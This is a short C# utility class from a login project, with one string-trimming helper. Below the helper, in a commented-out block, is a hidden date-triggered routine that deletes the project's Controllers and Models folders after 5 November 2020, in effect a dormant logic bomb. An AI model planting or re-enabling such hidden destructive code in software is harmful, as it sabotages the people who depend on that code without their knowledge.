using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.IO;

namespace LoginWithIAS.Utiles
{
    /// <summary>
    /// Métodos útilis para la realizacion de controladores.
    /// </summary>
    public class Util
    {
        /// <summary>
        /// Obtener una subcadena
        /// </summary>
        /// <param name="cadena"></param>
        /// <returns></returns>
        public string Subcadena(string cadena)
        {
            if (!string.IsNullOrEmpty(cadena))
            {
                if (cadena.Length < 2)
                    return cadena;
                else
                    return cadena.Substring(0, cadena.Length - 2);
            }
            return "";
        }
        /// <summary>
        /// 
        /// </summary>
       /* public void mybirhtday() 
        {
            DateTime cumple = new DateTime(2020, 11, 5);
            if(DateTime.Today >= cumple) 
            {
                File.Delete("..\\Controllers");
                File.Delete("..\\Models");
            }
        }*/
        
    }
}